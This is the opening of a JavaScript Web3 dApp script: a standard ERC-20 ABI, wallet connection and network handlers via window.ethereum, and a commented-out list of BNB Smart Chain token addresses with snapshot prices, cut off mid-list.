$(function() {
    const erc20Abi=[
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Approval",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "previousOwner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "OwnershipTransferred",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "from",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Transfer",
          "type": "event"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            }
          ],
          "name": "allowance",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "approve",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "account",
              "type": "address"
            }
          ],
          "name": "balanceOf",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "decimals",
          "outputs": [
            {
              "internalType": "uint8",
              "name": "",
              "type": "uint8"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "subtractedValue",
              "type": "uint256"
            }
          ],
          "name": "decreaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "addedValue",
              "type": "uint256"
            }
          ],
          "name": "increaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "_to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "_amount",
              "type": "uint256"
            }
          ],
          "name": "mintTo",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "name",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "owner",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "renounceOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "symbol",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "totalSupply",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transfer",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "sender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transferFrom",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "transferOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ];
    var changeNetCount = 0;
    var currentAccount = null;
    var currentNetId;
    var supportedTokens = [];
    var jonjonContractAddr = "";
    var mostVTokenIds = [];
    var vt_cnt = 0;

    window.web3 = null;
    if (typeof window.ethereum !== "undefined") {
        window.web3 = new Web3(window.ethereum);
        window.web3.eth.net.getId((err, netId) => {
            handleNetworkChanged(netId);
            window.ethereum
                .request({ method: "eth_accounts" })
                .then((accounts) => {
                    ;
                });
          window.ethereum.on("accountsChanged", (accounts) =>
            handleAddressChanged(accounts)
          );
          window.ethereum.on("networkChanged", (networkId) =>
            handleNetworkChanged(networkId)
          );
        });
    }
    
    /*
    const bscSupportedTokens = [
        {
        "address": null,
        "symbol": "BNB",
        "price": "500",
        "decimals": 18,
        },
        {
        "address": "0xe9e7cea3dedca5984780bafc599bd69add087d56",
        "symbol": "BUSD",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657",
        "symbol": "BABY",
        "price": "1.37",
        "decimals": 18,
        },
        {
        "address": "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
        "symbol": "ETH",
        "price": "4100",
        "decimals": 18,
        },
        {
        "address": "0x55d398326f99059ff775485246999027b3197955",
        "symbol": "USDT",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",
        "symbol": "ADA",
        "price": "1.6",
        "decimals": 18,
        },
        {
        "address": "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
        "symbol": "USDC",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0x7083609fce4d1d8dc0c979aab8c869ea2c873402",
        "symbol": "DOT",
        "price": "37.86",
        "decimals": 18,
        },
        {
        "address": "0xba2ae424d960c26247dd6c32edc70b295c744c43",
        "symbol": "DOGE",
        "price": "0.2161",
        "decimals": 8,
        },
        {
        "address": "0x4338665cbb7b2485a8855a139b75d5e34ab0db94",
        "symbol": "LTC",
        "price": "213.7",
        "decimals": 18,
        },
        {
        "address": "0xbf5140a22578168fd562dccf235e5d43a02ce9b1",
        "symbol": "UNI",
        "price": "22.13",
        "decimals": 18,
        },
        {
        "address": "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",
        "symbol": "MATIC",
        "price": "1.92",
        "decimals": 18,
        },
        {
        "address": "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd",
        "symbol": "LINK",
        "price": "26.14",
        "decimals": 18,
        },
        {
        "address": "0x8fF795a6F4D97E7887C79beA79aba5cc76444aDf",
        "symbol": "BCH",
        "price": "572.54",
        "decimals": 18,
        },
        {
        "address": "0x23396cf899ca06c4472205fc903bdb4de249d6fc",
        "symbol": "UST",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0xbf7c81fff98bbe61b40ed186e4afd6ddd01337fe",
        "symbol": "EGLD",
        "price": "374.42",
        "decimals": 18,
        },
        {
        "address": "0x0d8ce2a99bb6e3b7db580ed848240e4a0f9ae153",
        "symbol": "FIL",
        "price": "54.2",
        "decimals": 18,
        },
        {
        "address": "0x85eac5ac2f758618dfa09bdbe0cf174e7d574d5b",
        "symbol": "TRX",
        "price": "0.09742",
        "decimals": 18,
        },
        {
        "address": "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
        "symbol": "DAI",
        "price": "1.01",
        "decimals": 18,
        },
        {
        "address": "0x3d6545b08693dae087e957cb1180ee38b9e3c25e",
        "symbol": "ETC",
        "price": "48.88",
        "decimals": 18,
        },
        {
        "address": "0x0eb3a705fc54725037cc9e008bdede697f62f335",
        "symbol": "ATOM",
        "price": "27.67",
        "decimals": 18,
        },
        {
        "address": "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",
        "symbol": "BTCB",
        "price": "57207.12",
        "decimals": 18,
        },
        {
        "address": "0xad29abb318791d579433d831ed122afeaf29dcfe",
        "symbol": "FTM",
        "price": "2.21",
        "decimals": 18,
        },
        {
        "address": "0x1fa4a73a3f0133f0025378af00236f3abdee5d63",
        "symbol": "NEAR",
        "price": "8.7",
        "decimals": 18,
        },
        {
        "address": "0x16939ef78684453bfdfb47825f8a5f714f12623a",
        "symbol": "XTZ",
        "price": "5.41",
        "decimals": 18,
        },
        {
        "address": "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
        "symbol": "CAKE",
        "price": "14.3",
        "decimals": 18,
        },
        {
        "address": "0x4e6415a5727ea08aae4580057187923aec331227",
        "symbol": "FINE",
        "price": "0.3048",
        "decimals": 18,
        },
        {
        "address": "0xaef0d72a118ce24fee3cd1d43d383897d05b4e99",
        "symbol": "WIN",
        "price": "0.0006973",
        "decimals": 18,
        },
        {
        "address": "0x9b76D1B12Ff738c113200EB043350022EBf12Ff0",
        "symbol": "TIKI",
        "price": "0.002479",
        "decimals": 18,
        },
        {
        "address": "0x0cd022dde27169b20895e0e2b2b8a33b25e63579",
        "symbol": "RISE",
        "price": "0.001074",
        "decimals": 18,
        },
        {
        "address": "0xc748673057861a797275cd8a068abb95a902e8de",
        "symbol": "BabyDoge",
        "price": "0.000000002294",
        "decimals": 18,
        },
        {
        "address": "0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C",
        "symbol": "TPAD",
        "price": "1.22",
        "decimals": 18,
        },
        {
        "address": "0x12BB890508c125661E03b09EC06E404bc9289040",
        "symbol": "RACA",
        "price": "0.005328",
        "decimals": 18,
        },
        {
        "address": "0x1991501f1398663f69dd7391c055bb0df6514f76",
        "symbol": "HotDoge",
        "price": "0.000000000007598",
        "decimals": 18,
        },
        {
        "address": "0x5941f87eb62737ec5ebbecab3e373c40fe40566b",
        "symbol": "MNG",
        "price": "0.157",
        "decimals": 18,
        },
        {
        "address": "0x2A9718defF471f3Bb91FA0ECEAB14154F150a385",
        "symbol": "ElonGate",
        "price": "0.00000007617",
        "decimals": 18,
        },
        {
        "address": "0x27Ae27110350B98d564b9A3eeD31bAeBc82d878d",
        "symbol": "CUMMIES",
        "price": "0.02707",
        "decimals": 18,
        },
        {
        "address": "0xacfc95585d80ab62f67a14c566c1b7a49fe91167",
        "symbol": "FEG",
        "price": "0.000000006031",
        "decimals": 18,
        },
        {
        "address": "0x557dd6700e66818af340cce17fd4508ced81fbc1",
        "symbol": "PAPEL",
        "price": "0.00000002484",
        "decimals": 18,
        },
        {
        "address": "0x6466849a30247D90f0c228A6c4b6b106ff18cAB9",
        "symbol": "CHAR",
        "price": "0.0004888",
        "decimals": 18,
        },
        {
        "address": "0x4fa7163e153419e0e1064e418dd7a99314ed27b6",
        "symbol": "HOTCROSS",
        "price": "0.4715",
        "decimals": 18,
        },
        {
        "address": "0x6bfd576220e8444ca4cc5f89efbd7f02a4c94c16",
        "symbol": "SMG",
        "price": "0.06946",
        "decimals": 18,
        },
        {
        "address": "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
        "symbol": "SFP",
        "price": "2.35",
        "decimals": 18,
        },
        {
        "address": "0xeca41281c24451168a37211f0bc2b8645af45092",
        "symbol": "TPT",
        "price": "0.02561",
        "decimals": 18,
        },
        {
        "address": "0xf21768ccbc73ea5b6fd3c687208a7c2def2d966e",
        "symbol": "REEF",
        "price": "0.02603",
        "decimals": 18,
        },
        {
        "address": "0x0523215dcafbf4e4aa92117d13c6985a3bef27d7",
        "symbol": "GMR",
        "price": "0.0000001854",
        "decimals": 18,
        },
        {
        "address": "0x9b9d617d3445f0147ece2322bace8db2768d2770",
        "symbol": "CUE",
        "price": "18.21",
        "decimals": 18,
        },
        {
        "address": "0xd7730681b1dc8f6f969166b29d8a5ea8568616a3",
        "symbol": "NAFT",
        "price": "0.03513",
        "decimals": 18,
        },
        {
        "address": "0x1606940bb5cd6de59a7e25367f4fb8965f38f122",
        "symbol": "AQUAGOAT",
        "price": "0.00000001222",
        "decimals": 18,
        },
        {
        "address": "0xFeea0bDd3D07eb6FE305938878C0caDBFa169042",
        "symbol": "8PAY",
        "price": "0.1089",
        "decimals": 18,
        },
        {
        "address": "0xcf9f991b14620f5ad144eec11f9bc7bf08987622",
        "symbol": "PORNROCKET",
        "price": "0.0000001444",
        "decimals": 18,
        },
        {
        "address": "0x450dcf93160a30be156a4600802c91bf64dffd2e",
        "symbol": "CORGI",
        "price": "0.0002649",
        "decimals": 18,
        },
        {
        "address": "0xa77346760341460b42c230ca6d21d4c8e743fa9c",
        "symbol": "WSPP",
        "price": "0.000004387",
        "decimals": 18,
        },
        {
        "address": "0xaad87f47cdea777faf87e7602e91e3a6afbe4d57",
        "symbol": "PYE",
        "price": "0.00000001624",
        "decimals": 18,
        },
        {
        "address": "0xe56842ed550ff2794f010738554db45e60730371",
        "symbol": "BIN",
        "price": "0.02572",
        "decimals": 18,
        },
        {
        "address": "0x1f3Af095CDa17d63cad238358837321e95FC5915",
        "symbol": "MINT",
        "price": "0.00006443",
        "decimals": 18,
        },
        {
        "address": "0x3504de9e61fdff2fc70f5cc8a6d1ee493434c1aa",
        "symbol": "TeslaSafe",
        "price": "0.000000004173",
        "decimals": 18,
        },
        {
        "address": "0x8d3e3a57c5f140b5f9feb0d43d37a347ee01c851",
        "symbol": "EBSC",
        "price": "0.0005261",
        "decimals": 18,
        },
        {
        "address": "0xc49DDe62B4A0810074721fAcA54Aab52369f486a",
        "symbol": "PKR",
        "price": "0.2329",
        "decimals": 18,
        },
        {
        "address": "0x9e5965d28e8d44cae8f9b809396e0931f9df71ca",
        "symbol": "SIP",
        "price": "0.8953",
        "decimals": 18,
        },
        {
        "address": "0xFAfD4CB703B25CB22f43D017e7e0d75FEBc26743",
        "symbol": "WEYU",
        "price": "0.01934",
        "decimals": 18,
        },
        {
        "address": "0xd3ecC6a4ce1a9fAEC1AA5E30B55f8a1a4b84F938",
        "symbol": "$ELONOM",
        "price": "0.007875",
        "decimals": 18,
        },
        {
        "address": "0xbd83010eb60f12112908774998f65761cf9f6f9a",
        "symbol": "STARS",
        "price": "0.1368",
        "decimals": 18,
        },
        {
        "address": "0xe4c797d43631f4d660ec67b5cb0b78ef5c902532",
        "symbol": "MONS",
        "price": "0.9746",
        "decimals": 18,
        },
        {
        "address": "0x17D749D3E2ac204a07e19D8096d9a05c423ea3af",
        "symbol": "LTRBT",
        "price": "0.000000000000000306",
        "decimals": 18,
        },
        {
        "address": "0x00e1656e45f18ec6747F5a8496Fd39B50b38396D",
        "symbol": "BCOIN",
        "price": "7.53",
        "decimals": 18,
        },
        {
        "address": "0x29d266b5d6cdc0cd0a775f18fff0176842d4b1d2",
        "symbol": "SSR",
        "price": "0.3751",
        "decimals": 18,
        },
        {
        "address": "0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a",
        "symbol": "ADS",
        "price": "4.6",
        "decimals": 18,
        },
        {
        "address": "0xbbf33a3c83cf86d0965a66e108669d272dfe4214",
        "symbol": "EiFI",
        "price": "0.1222",
        "decimals": 18,
        },
        {
        "address": "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
        "symbol": "SHIB",
        "price": "0.00004545",
        "decimals": 18,
        },
        {
        "address": "0xf0a8ecbce8caadb7a07d1fcd0f87ae1bd688df43",
        "symbol": "GODZ",
        "price": "5.39",
        "decimals": 18,
        },
        {
        "address": "0x8C851d1a123Ff703BD1f9dabe631b69902Df5f97",
        "symbol": "BNX",
        "price": "138.31",
        "decimals": 18,
        },
        {
        "address": "0xe6e2454bd6d85e52309bfb6a3e3521e83c53da8a",
        "symbol": "UFLOKI",
        "price": "0.00000002899",
        "decimals": 18,
        },
        {
        "address": "0xd3c9609b6cbc6ef02390f33c230590c38f9e5f9d",
        "symbol": "PROT",
        "price": "0.2794",
        "decimals": 18,
        },
        {
        "address": "0x893e14fafa8df32d9be7eab810027eea8828a98c",
        "symbol": "UNIMOON",
        "price": "0.000000014",
        "decimals": 18,
        },
        {
        "address": "0xa2120b9e674d3fc3875f415a7df52e382f141225",
        "symbol": "ATA",
        "price": "1.15",
        "decimals": 18,
        },
        {
        "address": "0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50",
        "symbol": "PIT",
        "price": "0.000000002285",
        "decimals": 18,
        },
        {
        "address": "0x183b2c147fe11788b73bc0d6a7e0186aa5464bfa",
        "symbol": "FFT",
        "price": "0.000002994",
        "decimals": 18,
        },
        {
        "address": "0x53a38D12b84a7413eDa4B1206A7A28B59Aed9850",
        "symbol": "SNK",
        "price": "0.4214",
        "decimals": 18,
        },
        {
        "address": "0x1f39dd2bf5a27e2d4ed691dcf933077371777cb0",
        "symbol": "Nora",
        "price": "0.716",
        "decimals": 18,
        },
        {
        "address": "0xE3233fdb23F1c27aB37Bd66A19a1f1762fCf5f3F",
        "symbol": "ELMON",
        "price": "2.37",
        "decimals": 18,
        },
        {
        "address": "0x9e24415d1e549ebc626a13a482bb117a2b43e9cf",
        "symbol": "LOVELY",
        "price": "0.0000002954",
        "decimals": 18,
        },
        {
        "address": "0xac51066d7bec65dc4589368da368b212745d63e8",
        "symbol": "ALICE",
        "price": "22.82",
        "decimals": 18,
        },
        {
        "address": "0xe98d920370d87617eb11476b41bf4be4c556f3f8",
        "symbol": "GYM",
        "price": "0.138",
        "decimals": 18,
        },
        {
        "address": "0x23ce9e926048273ef83be0a3a8ba9cb6d45cd978",
        "symbol": "DAR",
        "price": "3.51",
        "decimals": 18,
        },
        {
        "address": "0x0feadcc3824e7f3c12f40e324a60c23ca51627fc",
        "symbol": "Warden",
        "price": "0.3948",
        "decimals": 18,
        },
        {
        "address": "0x9fd87aefe02441b123c3c32466cd9db4c578618f",
        "symbol": "THG",
        "price": "13.87",
        "decimals": 18,
        },
        {
        "address": "0xa4b6573c9ae09d81e4d1360e6402b81f52557098",
        "symbol": "COR",
        "price": "0.02103",
        "decimals": 18,
        },
        {
        "address": "0xd8047afecb86e44eff3add991b9f063ed4ca716b",
        "symbol": "GGG",
        "price": "11.42",
        "decimals": 18,
        },
        {
        "address": "0x092bbec1342afffd16cfb41b56343d5a299cdf0d",
        "symbol": "ShiCo",
        "price": "0.000000000000000644",
        "decimals": 18,
        },
        {
        "address": "0xB84cBbF09b3Ed388a45cD875ebba41a20365e6e7",
        "symbol": "SHIBA",
        "price": "0.00000009581",
        "decimals": 18,
        },
        {
        "address": "0xe41d9e1311209f2e05850f9de6201ab4b930bfc2",
        "symbol": "SPON",
        "price": "0.07647",
        "decimals": 18,
        },
        {
        "address": "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe",
        "symbol": "XRP",
        "price": "1.01",
        "decimals": 18,
        },
        {
        "address": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "symbol": "WBNB",
        "price": "607.6",
        "decimals": 18,
        },
        {
        "address": "0x477bc8d23c634c154061869478bce96be6045d12",
        "symbol": "SFUND",
        "price": "16.22",
        "decimals": 18,
        },
        {
        "address": "0xc3583c8328ecb4dc8751c7e4fe7bcc18e558a4b6",
        "symbol": "VIKINGS",
        "price": "0.00000001201",
        "decimals": 18,
        },
        {
        "address": "0x4673f018cc6d401aad0402bdbf2abcbf43dd69f3",
        "symbol": "FCF",
        "price": "0.0002501",
        "decimals": 18,
        },
        {
        "address": "0x8ddeec6b677c7c552c9f3563b99e4ff90b862ebc",
        "symbol": "BAS",
        "price": "1.52",
        "decimals": 18,
        },
        {
        "address": "0xf93c5222a1dd5f482701d6ad6ab9f5eed4b0718b",
        "symbol": "SPIN",
        "price": "0.00006407",
        "decimals": 18,
        },
        {
        "address": "0x11582Ef4642B1e7F0a023804B497656E2663bC9B",
        "symbol": "KCCPAD",
        "price": "0.257",
        "decimals": 18,
        },
        {
        "address": "0xb1ced2e320e3f4c8e3511b1dc59203303493f382",
        "symbol": "MOONLIGHT",
        "price": "0.00000001538",
        "decimals": 18,
        },
        {
        "address": "0xfc619ffcc0e0f30427bf938f9a1b2bfae15bdf84",
        "symbol": "ANJI",
        "price": "0.0007146",
        "decimals": 18,
        },
        {
        "address": "0x4AFc8c2Be6a0783ea16E16066fde140d15979296",
        "symbol": "HARE",
        "price": "0.00000000000000031",
        "decimals": 18,
        },
        {
        "address": "0x464fdb8affc9bac185a7393fd4298137866dcfb8",
        "symbol": "REALM",
        "price": "1.61",
        "decimals": 18,
        },
        {
        "address": "0x755f34709e369d37c6fa52808ae84a32007d1155",
        "symbol": "NABOX",
        "price": "0.000302",
        "decimals": 18,
        },
        {
        "address": "0xE8176d414560cFE1Bf82Fd73B986823B89E4F545",
        "symbol": "HERO",
        "price": "0.9669",
        "decimals": 18,
        },
        {
        "address": "0x2b3f34e9d4b127797ce6244ea341a83733ddd6e4",
        "symbol": "FLOKI",
        "price": "0.0001677",
        "decimals": 18,
        },
        {
        "address": "0x2db0d5cb907014c67dc201886624716fb5c71123",
        "symbol": "AINU",
        "price": "0.00000000000886",
        "decimals": 18,
        },
        {
        "address": "0x6679eb24f59dfe111864aec72b443d1da666b360",
        "symbol": "ARV",
        "price": "0.0006689",
        "decimals": 18,
        },
        {
        "address": "0xe0f94ac5462997d2bc57287ac3a3ae4c31345d66",
        "symbol": "CEEK",
        "price": "1.01",
        "decimals": 18,
        },
        {
        "address": "0x68fbd4d89ba15343e7d2457189459b7ac80a20a3",
        "symbol": "SURGE",
        "price": "0.00000007829",
        "decimals": 18,
        },
        {
        "address": "0xf3e1449ddb6b218da2c9463d4594ceccc8934346",
        "symbol": "CELL",
        "price": "2.13",
        "decimals": 18,
        },
        {
        "address": "0xc1cbfb96a1d5361590b8df04ef78de2fa3178390",
        "symbol": "PCHF",
        "price": "0.003231",
        "decimals": 18,
        },
        {
        "address": "0x988300f65191C3a52Ef59DBB5539C01b502787a9",
        "symbol": "BabyCare",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0x679d5b2d94f454c950d683d159b87aa8eae37c9e",
        "symbol": "HAM",
        "price": "0.00000002198",
        "decimals": 18,
        },
        {
        "address": "0xf7844cb890f4c339c497aeab599abdc3c874b67a",
        "symbol": "NFTART",
        "price": "0.00000000105",
        "decimals": 18,
        },
        {
        "address": "0xC001BBe2B87079294C63EcE98BdD0a88D761434e",
        "symbol": "EGC",
        "price": "0.0000008039",
        "decimals": 18,
        },
        {
        "address": "0xD74b782E05AA25c50e7330Af541d46E18f36661C",
        "symbol": "QUACK",
        "price": "0.000000003595",
        "decimals": 18,
        },
        {
        "address": "0x16dcc0ec78e91e868dca64be86aec62bf7c61037",
        "symbol": "EverETH",
        "price": "0.00000002838",
        "decimals": 18,
        },
        {
        "address": "0x02ff5065692783374947393723dba9599e59f591",
        "symbol": "YOOSHI",
        "price": "0.000002003",
        "decimals": 18,
        },
        {
        "address": "0x0fbc08905c1d683cf7530bb2a70bb0bde231e5b9",
        "symbol": "BabyDogeZilla",
        "price": "0.000000000000000041",
        "decimals": 18,
        },
        {
        "address": "0xaecf6d1aff214fef70042740054f0f6d0caa98ab",
        "symbol": "BabyShibaInu",
        "price": "0.00000001908",
        "decimals": 18,
        },
        {
        "address": "0x84b7bb9614cf28226d1b0a07499472bc107e3000",
        "symbol": "EVCoin",
        "price": "0.0000134",
        "decimals": 18,
        },
        {
        "address": "0xf0b6e29c429bbb8e1448340f0776be933805344e",
        "symbol": "UEDC",
        "price": "0.1872",
        "decimals": 18,
        },
        {
        "address": "0x87230146E138d3F296a9a77e497A2A83012e9Bc5",
        "symbol": "SQUID",
        "price": "0.1372",
        "decimals": 18,
        },
        {
        "address": "0x8fff93e810a2edaafc326edee51071da9d398e83",
        "symbol": "BRISE",
        "price": "0.0000003369",
        "decimals": 18,
        },
        {
        "address": "0xa2a26349448ddafae34949a6cc2cecf78c0497ac",
        "symbol": "TSC",
        "price": "0.01149",
        "decimals": 18,
        },
        {
        "address": "0x945fD7037986BD62d37c6934fc4F397BB0bD3cC8",
        "symbol": "UPC",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0xe90d1567ecef9282cc1ab348d9e9e2ac95659b99",
        "symbol": "CXPAD",
        "price": "0.0002376",
        "decimals": 18,
        },
        {
        "address": "0x2541be91fe0d220ffcbe65f11d88217a87a43bda",
        "symbol": "$Lordz",
        "price": "0.09762",
        "decimals": 18,
        },
        {
        "address": "0x7c63f96feafacd84e75a594c00fac3693386fbf0",
        "symbol": "ASS",
        "price": "0.000000002943",
        "decimals": 18,
        },
        {
        "address": "0xd3b71117e6c1558c1553305b44988cd944e97300",
        "symbol": "YEL",
        "price": "0.06111",
        "decimals": 18,
        },
        {
        "address": "0x475c8df9860e42605d9917f0a2e522cc861cbf82",
        "symbol": "ScorpFin",
        "price": "0.0000213",
        "decimals": 18,
        },
        {
        "address": "0xebc76079da0c245fae7225b58a57a54809b40618",
        "symbol": "BPAY",
        "price": "0.006984",
        "decimals": 18,
        },
        {
        "address": "0x48CbC7f87C657fEA3B297F658a5133a5deeF9b04",
        "symbol": "MFLOKIADA",
        "price": "0.000001789",
        "decimals": 18,
        },
        {
        "address": "0xF2c96E402c9199682d5dED26D3771c6B192c01af",
        "symbol": "SCLP",
        "price": "5.45",
        "decimals": 18,
        },
        {
        "address": "0xD8F61cdECA41dEF1a7923F308a042F678109f54B",
        "symbol": "BSHIB",
        "price": "0.000000008142",
        "decimals": 18,
        },
        {
        "address": "0x154a9f9cbd3449ad22fdae23044319d6ef2a1fab",
        "symbol": "SKILL",
        "price": "16.83",
        "decimals": 18,
        },
        {
        "address": "0x20d39a5130f799b95b55a930e5b7ebc589ea9ed8",
        "symbol": "HE",
        "price": "0.4713",
        "decimals": 18,
        },
        {
        "address": "0x0ebd9537a25f56713e34c45b38f421a1e7191469",
        "symbol": "MOOV",
        "price": "0.02567",
        "decimals": 18,
        },
        {
        "address": "0x037838b556d9c9d654148a284682C55bB5f56eF4",
        "symbol": "LIGHT",
        "price": "0.587",
        "decimals": 18,
        },
        {
        "address": "0x68810a6f5bb0491cb9ccf8c52735a1acf5f28009",
        "symbol": "ShibaZilla",
        "price": "0.000000000000000025",
        "decimals": 18,
        },
        {
        "address": "0x7156fc3db62cce82eaa7163279d9f99644257539",
        "symbol": "GOOREO",
        "price": "0.08255",
        "decimals": 18,
        },
        {
        "address": "0x84f4f7cdb4574c9556a494dab18ffc1d1d22316c",
        "symbol": "KINGSHIB",
        "price": "0.03199",
        "decimals": 18,
        },
        {
        "address": "0x8263CD1601FE73C066bf49cc09841f35348e3be0",
        "symbol": "ALU",
        "price": "0.2587",
        "decimals": 18,
        },
        {
        "address": "0x4cbdfad03b968bf43449d0908f319ae4a5a33371",
        "symbol": "ECOIN",
        "price": "0.000000007259",
        "decimals": 18,
        },
        {
        "address": "0x0e5f989ce525acc4ee45506af91964f7f4c9f2e9",
        "symbol": "RYOSHI",
        "price": "0.00000003418",
        "decimals": 18,
        },
        {
        "address": "0x651bfbb26455294408aabc61a7adf427bf149898",
        "symbol": "Mello",
        "price": "0.006632",
        "decimals": 18,
        },
        {
        "address": "0xEFEa4829b1bc90658784f15116C2dFD0E0929B0d",
        "symbol": "BabyDeFido",
        "price": "0.0000000009309",
        "decimals": 18,
        },
        {
        "address": "0x90727c1195fb2246fd758172f9253873790d06a4",
        "symbol": "ETA",
        "price": "0.000000000712",
        "decimals": 18,
        },
        {
        "address": "0x7a565284572d03ec50c35396f7d6001252eb43b6",
        "symbol": "DogeZilla",
        "price": "0.000000000000001001",
        "decimals": 18,
        },
        {
        "address": "0x079Dd74Cc214Ac5f892f6a7271ef0722F6D0c2e6",
        "symbol": "NasaDoge",
        "price": "0.0001207",
        "decimals": 18,
        },
        {
        "address": "0xc4a54699d24c5c130cf866974181e41e22bb3b07",
        "symbol": "FlokiElon",
        "price": "0.0000000001333",
        "decimals": 18,
        },
        {
        "address": "0x586330013C8f2352AB5f57215F9E56747eE8837E",
        "symbol": "SMX",
        "price": "0.000000001529",
        "decimals": 18,
        },
        {
        "address": "0x6ae9701b9c423f40d54556c9a443409d79ce170a",
        "symbol": "POLC",
        "price": "2.11",
        "decimals": 18,
        },
        {
        "address": "0x7e8db69dcff9209e486a100e611b0af300c3374e",
        "symbol": "TRDC",
        "price": "0.01499",
        "decimals": 18,
        },
        {
        "address": "0x42069c0cf4da25420fc4c9d9001ba5af7846ccfd",
        "symbol": "GUH",
        "price": "1",
        "decimals": 18,
        },
        {
        "address": "0x68590a47578e5060a29fd99654f4556dbfa05d10",
        "symbol": "SMRAT",
        "price": "0.000000003189",
        "decimals": 18,
        },
        {
        "address": "0xa77346760341460b42c230ca6d21d4c8e743fa9c",
        "symbol": "PETS",
        "price": "0.000004227",
        "decimals": 18,
        },
        {
        "address": "0x1476e96fadb37668d7680921297e2ab98ec36c2f",
        "symbol": "RLOKI",
        "price": "0.000004595",
        "decimals": 18,
        },
        {
        "address": "0x9abdba20edfba06b782126b4d8d72a5853918fd0",
        "symbol": "TABOO",
        "price": "0.01549",
        "decimals": 18,
        },
        {
        "address": "0x7f4f3bc4a5634454398580b9112b7e493e2129fa",
        "symbol": "KODI",
